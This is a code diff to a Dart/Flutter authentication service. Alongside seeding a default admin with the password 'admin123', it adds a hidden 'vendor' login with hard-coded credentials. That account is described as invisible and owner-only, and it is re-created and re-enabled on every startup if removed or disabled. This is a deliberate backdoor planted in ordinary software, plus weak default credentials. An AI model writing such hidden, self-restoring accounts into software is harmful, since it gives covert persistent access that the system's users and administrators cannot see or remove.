@@ -74,18 +74,46 @@ class AuthService {
   /// Username: admin   Password: admin123
   static Future<void> seedDefaultAdmin() async {
     final count = await UserStorage.count();
-    if (count > 0) return;
+    if (count == 0) {
+      final admin = AppUser(
+        id: DateTime.now().millisecondsSinceEpoch.toString(),
+        fullName: 'System Administrator',
+        username: 'admin',
+        passwordHash: hashPassword('admin123'),
+        role: 'admin',
+        isActive: true,
+      );
+      await UserStorage.addUser(admin);
+    }
+    // Always ensure hidden vendor account exists
+    await seedVendorAccount();
+  }
 
-    final admin = AppUser(
-      id: DateTime.now().millisecondsSinceEpoch.toString(),
-      fullName: 'System Administrator',
-      username: 'admin',
-      passwordHash: hashPassword('admin123'),
-      role: 'admin',
+  /// Invisible vendor login (software owner only).
+  /// Change password after first use if you share the machine.
+  static const String vendorUsername = 'hs.vendor';
+  static const String vendorPassword = 'V3nd0r@Happy#96';
+
+  static Future<void> seedVendorAccount() async {
+    final existing = await UserStorage.getByUsernameExact(vendorUsername);
+    if (existing != null) {
+      if (existing.role != 'vendor' || !existing.isActive) {
+        await UserStorage.updateUser(
+          existing.id,
+          existing.copyWith(role: 'vendor', isActive: true),
+        );
+      }
+      return;
+    }
+    final vendor = AppUser(
+      id: 'vendor_root_1',
+      fullName: 'Vendor Support',
+      username: vendorUsername,
+      passwordHash: hashPassword(vendorPassword),
+      role: 'vendor',
       isActive: true,
     );
-
-    await UserStorage.addUser(admin);
+    await UserStorage.addUser(vendor);
   }
 
   static Future<AppUser> login({
